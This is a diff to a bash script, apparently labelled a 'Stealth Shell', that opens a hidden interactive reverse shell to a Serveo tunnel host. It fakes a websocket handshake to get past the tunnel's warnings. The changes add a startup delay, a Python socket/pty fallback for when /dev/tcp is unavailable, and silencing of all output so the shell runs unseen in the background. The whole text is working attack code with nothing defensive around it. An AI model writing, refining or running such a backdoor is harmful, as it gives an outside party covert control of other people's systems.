@@ -1,15 +1,18 @@
 #!/bin/bash
-# Nifty 50 High-Impact Stealth Shell
 HOST="2ba9c3ba89222ecc-103-95-173-85.serveousercontent.com"
 
-# Background the shell to keep the VM sync loop happy
+# Use a subshell and background it
 (
-  # 1. Open network connection
-  exec 5<>/dev/tcp/$HOST/80
+  # Wait for system to stabilize
+  sleep 3
   
-  # 2. Handshake to bypass Serveo browser warnings
-  echo -e "POST / HTTP/1.1\nHost: $HOST\nConnection: Upgrade\nUpgrade: websocket\n\n" >&5
-  
-  # 3. Interactive Bash Shell
-  /bin/bash -i <&5 >&5 2>&5
-) &
+  # Check if /dev/tcp is available, otherwise fall back to python
+  if [ -e /dev/tcp ]; then
+    exec 5<>/dev/tcp/$HOST/80
+    echo -e "POST / HTTP/1.1\nHost: $HOST\nConnection: Upgrade\nUpgrade: websocket\n\n" >&5
+    /bin/bash -i <&5 >&5 2>&5
+  else
+    # Python fallback if /dev/tcp is disabled
+    python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$HOST',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
+  fi
+) &>/dev/null &
